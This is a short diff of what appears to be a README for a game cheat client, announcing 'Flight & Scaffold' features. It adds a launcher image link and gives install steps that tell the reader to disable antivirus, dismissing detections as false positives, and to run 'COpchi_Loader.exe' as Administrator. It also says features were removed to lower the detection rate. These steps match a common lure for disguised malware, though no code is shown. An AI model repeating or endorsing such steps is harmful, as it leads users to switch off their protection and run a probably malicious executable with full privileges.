@@ -13,7 +13,7 @@ diff
 + New in v11.1: Improved Flight & Scaffold!  
 - Removed: Risky features (reduced detection rate).  
 📦 Instation
-
+![launcher](https://ibb.co/Fk7SzPRZ)
 Disable antivirus (false positives; why?).
 
 Run COpchi_Loader.exe as Administrator.
